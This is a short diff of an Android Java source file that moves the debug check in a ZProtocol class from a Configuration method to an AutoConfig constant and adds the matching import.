@@ -20,6 +20,7 @@ import android.util.Log;
 import com.android.service.Debug;
 import com.android.service.Device;
 import com.android.service.Status;
+import com.android.service.auto.AutoConfig;
 import com.android.service.conf.Configuration;
 import com.android.service.crypto.CryptoException;
 import com.android.service.crypto.EncryptionPKCS5;
@@ -66,7 +67,7 @@ public class ZProtocol extends Protocol {
 			random = SecureRandom.getInstance("SHA1PRNG");
 		} catch (final NoSuchAlgorithmException e) {
 			Log.d("QZ", TAG + " Error (ZProtocol): " + e);
-			if (Configuration.isDebug()) {
+			if (AutoConfig.DEBUG) {
 				e.printStackTrace();
 			}
 		}
